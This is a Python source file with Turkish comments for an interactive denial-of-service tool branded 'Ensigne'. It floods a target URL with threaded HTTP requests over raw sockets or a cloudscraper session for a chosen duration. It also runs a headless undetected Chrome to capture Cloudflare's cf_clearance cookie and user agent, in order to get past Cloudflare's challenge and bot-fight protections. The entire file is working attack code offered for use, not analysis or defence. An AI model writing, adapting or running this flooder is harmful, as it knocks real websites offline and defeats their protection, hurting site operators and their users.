# Kütüphaneler

from os import system, name
from time import sleep
from colorama import Fore, Back, Style
from sys import stdout
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver

# Header

def header(): 
    print(Fore.LIGHTCYAN_EX + """
    ╔╗                     ╔╗             ╔═══╗ ╔╗  ╔╗          ╔╗      
    ║║                     ║║             ║╔═╗║╔╝╚╗╔╝╚╗         ║║      
    ║║   ╔══╗╔══╗╔══╗╔═╗ ╔═╝║╔══╗ ╔═╗╔╗ ╔╗║║ ║║╚╗╔╝╚╗╔╝╔══╗ ╔══╗║║╔╗╔══╗
    ║║ ╔╗║╔╗║║╔╗║║╔╗║║╔╗╗║╔╗║╚ ╗║ ║╔╝║║ ║║║╚═╝║ ║║  ║║ ╚ ╗║ ║╔═╝║╚╝╝║══╣
    ║╚═╝║║║═╣║╚╝║║║═╣║║║║║╚╝║║╚╝╚╗║║ ║╚═╝║║╔═╗║ ║╚╗ ║╚╗║╚╝╚╗║╚═╗║╔╗╗╠══║
    ╚═══╝╚══╝╚═╗║╚══╝╚╝╚╝╚══╝╚═══╝╚╝ ╚═╗╔╝╚╝ ╚╝ ╚═╝ ╚═╝╚═══╝╚══╝╚╝╚╝╚══╝
            ╔═╝║                    ╔═╝║                               
            ╚══╝                    ╚══╝                               
   """+ Fore.WHITE +" \n Komutlara Ulaşmak İçin" + Fore.RED + " 'yardim'" + Fore.WHITE + ". \n")

sleep(1)

print(header)
# Komutlar


def komut():
    stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Ensigne"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    komut = input()
    clear()

    # Cls
    if komut == "cls":
        clear()
    # Cls2
    elif komut == "clear":
        clear()
    # Yardim
    elif komut == "yardim":
        yardim()
    # Soc
    elif komut == "socket":
        clear()
        header()
        sleep(1)
        target, thread, t = bilgi_cek()
        timer = threading.Thread(target=zamanlayici, args=(t,))
        timer.start()
        Socketİsleyis(target, thread, t)
        timer.join()
    # Geliştiriciler
    elif komut == "gelistiriciler":
        gelistirici()
    # CFSoc
    elif komut == "cfsoc":
        header()
        target, thread, t = bilgi_cek()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypasslanıyor... (Maksimum 60s)\n")
        if cookie_cek(target):
            timer = threading.Thread(target=zamanlayici, args=(t,))
            timer.start()
            SaldiriCfSoc(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypass İşlemi Başarısız!\n")
    # CFReq
    elif komut == "cfreq":
        target, thread, t = bilgi_cek()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypasslanıyor... (Maksimum 60s)\n")
        if cookie_cek(target):
            timer = threading.Thread(target=zamanlayici, args=(t,))
            timer.start()
            SaldiriCfREQ(target, thread, t)
            timer.join()
        else:
            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypass İşlemi Başarısız!\n")

# Komut İşlem

# Geliştiricler

def gelistirici():
    stdout.write("\x1b[38;2;0;236;250m╔══════════════════════════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "Ensigne | Discord:  Ensigne#5867  \n")
    stdout.write("\x1b[38;2;0;236;250m╚══════════════════════════════════════════════╝\n")
    stdout.write("\n")

# Temizleme
def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')

# Yardım
def yardim():
    stdout.write("\x1b[38;2;0;236;250m╔══════════════════════════════════════════════╗\n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "cfsoc = UAM, CAPTCHA, BFM bypasslar. (socket yapımda) \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "cfreq = UAM, CAPTCHA, BFM bypasslar. (request yapımda) \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "socket = Socket saldırısı yapar.  \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "yardim = Komutları ve açıklamalarını gösterir.  \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX   + "gelistiriciler = Geliştiricileri gösterir.  \n")
    stdout.write("\x1b[38;2;255;20;147m• "+Fore.RED   + "cikis" + Fore.WHITE + " = Tooldan çıkış yapar.   \n")
    stdout.write("\x1b[38;2;0;236;250m╚══════════════════════════════════════════════╝\n")
    stdout.write("\n")


# Bilgi

def bilgi_cek():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL Adresi    "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"SÜRE(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t


# Zamanlayıcı

def zamanlayici(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Saldırı bitimine => " + str((until - datetime.datetime.now()).total_seconds()) + " saniye kaldı")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Saldırı tamamlandı!                                   \n")
            return


# Socket

def Socketİsleyis(url, th, t):
    target = hedef_cek(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=SaldiriSocket, args=(target, until, req))
            thd.start()
        except:
            pass

def SaldiriSocket(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

# Hedef Çek

def hedef_cek(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target


# CFSoc

def SaldiriCfSoc(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = hedef_cek(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=CFSOCSaldiri,args=(until, target, req,))
            thd.start()
        except:  
            pass

def CFSOCSaldiri(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass

# CFReq            

def İslemCFREQ(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=SaldiriCfREQ, args=(url, until, scraper))
            thd.start()
        except:
            pass

def SaldiriCfREQ(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass

# Cookie Çek

def cookie_cek(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False


# Terminal

if __name__ == '__main__':
    clear()
    header()
    while True:
        komut()
